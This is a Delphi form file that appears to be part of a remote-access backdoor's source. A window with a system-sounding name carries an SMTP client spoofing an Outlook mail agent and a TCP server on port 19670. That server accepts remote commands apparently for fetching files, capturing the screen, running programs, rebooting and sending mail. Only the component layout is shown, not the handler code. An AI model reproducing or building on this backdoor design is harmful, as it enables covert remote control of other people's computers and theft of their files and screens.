object Form1: TForm1
  Left = 53
  Top = 123
  Caption = 'WinFormNTSystem'
  ClientHeight = 39
  ClientWidth = 189
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  Position = poDesigned
  OnCloseQuery = FormCloseQuery
  OnCreate = FormCreate
  OnDestroy = FormDestroy
  PixelsPerInch = 96
  TextHeight = 13
  object smtp: TIdSMTP
    MailAgent = 'Outlook Microsoft Mail Agent'
    SASLMechanisms = <>
    Left = 56
    Top = 8
  end
  object TCPServer: TIdCmdTCPServer
    Bindings = <>
    DefaultPort = 19670
    CommandHandlers = <
      item
        CmdDelimiter = ' '
        Command = 'MSSG'
        Disconnect = False
        Name = 'TIdCommandHandler0'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler0Command
      end
      item
        CmdDelimiter = ' '
        Command = 'CHAT_'
        Disconnect = False
        Name = 'TIdCommandHandler1'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler1Command
      end
      item
        CmdDelimiter = ' '
        Command = 'GFIL'
        Disconnect = False
        Name = 'TIdCommandHandler2'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler2Command
      end
      item
        CmdDelimiter = ' '
        Command = 'REBO'
        Disconnect = False
        Name = 'TIdCommandHandler3'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerCommandHandlers3Command
      end
      item
        CmdDelimiter = ' '
        Command = 'GSCR'
        Disconnect = False
        Name = 'TIdCommandHandler4'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler4Command
      end
      item
        CmdDelimiter = ' '
        Command = 'RUN_'
        Disconnect = False
        Name = 'TIdCommandHandler5'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler5Command
      end
      item
        CmdDelimiter = ' '
        Command = 'WWW_'
        Disconnect = False
        Name = 'TIdCommandHandler6'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler6Command
      end
      item
        CmdDelimiter = ' '
        Command = 'SMAI'
        Disconnect = False
        Name = 'TIdCommandHandler7'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler7Command
      end
      item
        CmdDelimiter = ' '
        Command = 'GLDI'
        Disconnect = False
        Name = 'TIdCommandHandler8'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler8Command
      end
      item
        CmdDelimiter = ' '
        Command = 'SCRE'
        Disconnect = False
        Name = 'TIdCommandHandler9'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerTIdCommandHandler9Command
      end
      item
        CmdDelimiter = ' '
        Command = 'SHOO'
        Disconnect = False
        Name = 'TIdCommandHandler10'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerCommandHandlers10Command
      end
      item
        CmdDelimiter = ' '
        Command = 'SOUN'
        Disconnect = False
        Name = 'TIdCommandHandler11'
        NormalReply.Code = '200'
        ParamDelimiter = ' '
        Tag = 0
        OnCommand = TCPServerCommandHandlers11Command
      end>
    ExceptionReply.Code = '500'
    ExceptionReply.Text.Strings = (
      'Unknown Internal Error')
    Greeting.Code = '200'
    Greeting.Text.Strings = (
      'Welcome')
    HelpReply.Code = '100'
    HelpReply.Text.Strings = (
      'Help follows')
    MaxConnectionReply.Code = '300'
    MaxConnectionReply.Text.Strings = (
      'Too many connections. Try again later.')
    ReplyTexts = <
      item
      end>
    ReplyUnknownCommand.Code = '400'
    ReplyUnknownCommand.Text.Strings = (
      'Unknown Command')
    Left = 24
    Top = 8
  end
end
